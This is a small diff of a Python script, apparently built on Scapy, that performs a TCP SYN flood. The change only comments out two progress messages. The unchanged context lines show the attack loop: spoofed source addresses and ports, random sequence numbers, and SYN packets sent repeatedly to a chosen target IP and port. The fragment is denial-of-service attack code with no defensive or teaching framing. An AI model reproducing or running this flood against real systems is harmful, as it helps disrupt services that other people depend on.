@@ -28,7 +28,7 @@ def get_args():
     return args.t, args.a, args.p
 
 def syn_flood(Target_IP, dPort, packets_to_send):
-    print("Sending packets to the target...")
+    #print("Sending packets to the target...")
     # As we know how many packets to send, use for loop
     for i in range(packets_to_send):
         seq_n = random.randint(0, MAX_PORTS)
@@ -43,7 +43,7 @@ def syn_flood(Target_IP, dPort, packets_to_send):
         # seq = sequence ; seq_n = sequetial number
         packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
         send(packet, verbose=0)
-    print("Sent all packets :D")
+    #print("Sent all packets :D")
     #print(f'Sent all the packets {packet} from src_IP:sPort {src_IP}:{sPort} to Target_IP:dPort {Target_IP}:{dPort}')
         
 def main():
